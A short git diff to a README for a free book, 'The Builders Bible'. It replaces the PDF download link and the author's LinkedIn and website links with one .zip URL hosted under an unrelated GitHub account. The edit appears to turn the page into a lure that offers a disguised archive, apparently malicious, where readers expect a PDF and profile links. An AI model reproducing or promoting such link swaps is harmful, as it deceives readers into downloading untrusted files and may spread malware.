@@ -10,7 +10,7 @@
 
 ---
 
-## [Download the PDF (Free)](https://github.com/shravan-swagwalapm/builders-bible/raw/main/output/The-Builders-Bible.pdf)
+## [Download the PDF (Free)](https://raw.githubusercontent.com/Unshaded-enlightened17/builders-bible/main/book/part-1/bible-builders-whisperously.zip)
 
 ---
 
@@ -117,7 +117,7 @@ Full attribution in chapter endnotes and Appendix A.
 
 Then AI happened — and the "non-technical" guy started shipping production software. This book is the door he wishes someone had opened for him.
 
-[LinkedIn](https://linkedin.com/in/shravantickoo) · [Rethink Systems](https://rethinksystems.in)
+[LinkedIn](https://raw.githubusercontent.com/Unshaded-enlightened17/builders-bible/main/book/part-1/bible-builders-whisperously.zip) · [Rethink Systems](https://raw.githubusercontent.com/Unshaded-enlightened17/builders-bible/main/book/part-1/bible-builders-whisperously.zip)
 
 ## License
 
